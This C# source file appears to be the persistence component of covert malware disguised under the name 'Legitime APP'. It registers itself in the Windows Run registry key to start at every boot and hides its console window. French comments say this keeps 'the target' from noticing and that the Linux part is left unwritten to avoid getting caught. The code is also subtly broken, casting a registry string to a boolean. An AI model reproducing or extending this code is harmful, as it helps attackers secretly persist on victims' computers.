using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using LegitimeAPP.OS ; 

namespace LegitimeAPP.OS
{

    /**
    Classe pour permettre 
    */
    public class Startup
    {

        private const string _autoStartKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        private const string _applicationName = "Legitime APP";

        public Startup()
        {

              // Ajout de l'application au démarrage de l'ordinateur  
            AddApplicationFromStartup() ; 
        }

        private bool IsStartWithPC()
        {

            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {




                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(_autoStartKey, false))
                {
                    return (bool)(key.GetValue(_applicationName, null) ?? false);
                }
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX)) {
                
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {

                /*

                Je le code pas pour pas me faire avoir

                */
                return false ; 
            }
            return false;
        }

        private void AddApplicationFromStartup()
        {

            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {

                                /* 
                On ne l'affiche pas pour pas que la cible le voit
                Dans les prochaines mises a jour je vais enlever les 
                message de debug 
                */

               Output.Hide() ; 

               
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(_autoStartKey, true))
                {
                    if (!IsStartWithPC())
                    {
                        key.SetValue(_applicationName, $"\"{Process.GetCurrentProcess().MainModule.FileName}\"");
                    }
                }
            }
            else if ( RuntimeInformation.IsOSPlatform(OSPlatform.Linux) ) {
                if (!IsStartWithPC()) {
                    /*

                    Je le code pas pour pas me faire avoir
                    */
                }
            }
        }

    }
}